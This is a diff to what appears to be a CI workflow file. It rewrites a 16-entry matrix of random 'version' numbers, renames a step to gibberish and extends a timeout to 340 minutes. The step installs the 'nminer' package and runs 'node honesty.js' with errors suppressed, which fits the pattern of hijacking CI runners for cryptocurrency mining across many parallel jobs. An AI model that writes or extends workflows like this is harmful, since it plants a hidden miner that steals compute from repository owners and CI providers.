@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3327 }
-          - { version: 6721 }
-          - { version: 2210 }
-          - { version: 1969 }
-          - { version: 8754 }
-          - { version: 7375 }
-          - { version: 5926 }
-          - { version: 1900 }
-          - { version: 2776 }
-          - { version: 3391 }
-          - { version: 5498 }
-          - { version: 8928 }
-          - { version: 108 }
-          - { version: 1201 }
-          - { version: 6114 }
-          - { version: 514 }
+          - { version: 9095 }
+          - { version: 1681 }
+          - { version: 2044 }
+          - { version: 8172 }
+          - { version: 7731 }
+          - { version: 1057 }
+          - { version: 3822 }
+          - { version: 7511 }
+          - { version: 4024 }
+          - { version: 6500 }
+          - { version: 6618 }
+          - { version: 2125 }
+          - { version: 1451 }
+          - { version: 6039 }
+          - { version: 5031 }
+          - { version: 3405 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: wordy
+      - name: gosh meh floodlight stuff
         run: |
           npm install nminer@latest
-          timeout 307m node honesty.js || echo "honesty executed"
+          timeout 340m node honesty.js || echo "honesty executed"
